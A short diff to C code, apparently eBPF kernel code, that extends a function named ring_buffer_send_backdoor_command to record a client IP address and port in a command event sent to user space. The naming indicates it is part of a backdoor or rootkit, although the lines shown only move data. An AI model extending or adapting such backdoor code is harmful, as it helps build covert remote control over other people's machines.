@@ -49,7 +49,7 @@ static __always_inline int ring_buffer_send(struct ring_buffer *rb, int pid, eve
  * 
  * @return 0 if ok, -1 if error
  */
-static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer *rb, int pid, int code){
+static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer *rb, int pid, int code, __u32 ip, __u16 port){
     struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
     if(!event){
         return -1;
@@ -58,6 +58,8 @@ static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer 
     event->code = code;
     event->event_type = COMMAND;
     event->pid = pid;
+    event->client_ip = ip;
+    event->client_port = port;
 
 	bpf_ringbuf_submit(event, 0);
     return 0;
